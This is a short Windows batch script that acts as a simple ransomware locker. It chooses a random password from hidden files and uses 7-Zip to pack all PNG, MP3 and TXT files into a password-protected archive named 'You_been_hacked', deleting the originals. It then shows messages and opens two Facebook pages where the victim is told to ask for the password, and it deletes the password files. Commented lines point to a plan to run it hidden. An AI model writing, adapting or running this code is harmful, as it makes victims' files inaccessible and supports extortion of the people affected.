@echo off
::mode 20,1
::this will run the program in hidden mode
::powershell -window hidden -command ""
::attrib +h 7z
::start /min "" "https://www.google.com/"
::this will set var for password that is inside Readme file
::set /A ran=%RANDOM% * 5 / 32768 + 1
set /A ran=%random% %%5 +1
echo %ran%
if %ran% == 1 set /p password=<"pass1" && set id=2z65Wc6 && echo 2z65Wc6 | clip
if %ran% == 2 set /p password=<"pass2" && set id=stq2vBR && echo stq2vBR | clip
if %ran% == 3 set /p password=<"pass3" && set id=4tzVBPL && echo 4tzVBPL | clip
if %ran% == 4 set /p password=<"pass4" && set id=zCQ86bw && echo zCQ86bw | clip
if %ran% == 5 set /p password=<"pass5" && set id=9FwxgFf && echo 9FwxgFf | clip
echo %id%
ATTRIB +R +H pass1
ATTRIB +R +H pass2
ATTRIB +R +H pass3
ATTRIB +R +H pass4
ATTRIB +R +H pass5
::this will zip the file .png and mp3 with password
7z.exe -sdel a -tzip You_been_hacked "*.png" "*.mp3" "*.txt" -p%password%
::this will delete the file ReadME where the password is stored
start cmd /k echo to get password:https://www.facebook.com/Science.Khuong or https://www.facebook.com/johnnyjumperbot and say "need password" id:%id%
msg * to get password:https://www.facebook.com/Science.Khuong or https://www.facebook.com/johnnyjumperbot and say "need password"
start /min "" "https://www.facebook.com/Science.Khuong"
start /min "" "https://www.facebook.com/johnnyjumperbot"
del /s /q pass1
del /s /q pass2
del /s /q pass3
del /s /q pass4
del /s /q pass5
exit
